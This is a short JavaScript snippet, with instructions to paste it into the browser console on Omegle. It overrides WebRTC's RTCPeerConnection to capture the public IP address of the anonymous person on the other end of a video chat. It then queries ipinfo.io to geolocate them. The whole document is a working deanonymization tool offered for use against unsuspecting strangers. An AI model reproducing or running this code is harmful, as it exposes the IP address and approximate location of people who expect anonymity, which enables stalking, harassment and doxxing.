/*
open omegle
click ctrl + shift + i
paste code in consloe
*** Make Sure you update your token from ipinfo.io website account token
*/
window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection

window.RTCPeerConnection = function(...args) {
 const socialcodia = new window.oRTCPeerConnection(...args)

socialcodia.oaddIceCandidate = socialcodia.addIceCandidate

socialcodia.addIceCandidate = function(iceCandidate, ...rest) {
 const mufazmi = iceCandidate.candidate.split(' ')

if (mufazmi[7] === 'srflx') {
	/*
console.clear()
*/
fetchLocation(mufazmi[4])
}
return socialcodia.oaddIceCandidate(iceCandidate, ...rest)

}

return socialcodia
}


function fetchLocation(ip)
{
	fetch('https://ipinfo.io/'+ip+'?token=Your Token Here')
	.then( res => res.json() )
	.then(response => {
		console.log(response)

		
	}) 
	.catch(error => console.error('Error:', error));
}
